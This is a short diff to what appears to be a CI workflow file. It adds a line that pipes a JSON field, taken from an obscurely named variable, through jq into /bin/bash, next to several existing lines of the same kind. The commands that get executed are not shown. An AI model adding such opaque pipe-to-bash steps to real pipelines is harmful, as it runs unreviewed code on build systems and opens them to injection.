@@ -19,6 +19,7 @@ jobs:
           printf '%s' "$p272" | jq -r .nqofg332 | /bin/bash
           echo $lnso8741 | jq -r .cx8533 | /bin/bash
           printf '%s' "$vmhgd1643" | jq -r .njfdv32 | /bin/bash
+          echo $c1 | jq -r .fc36 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
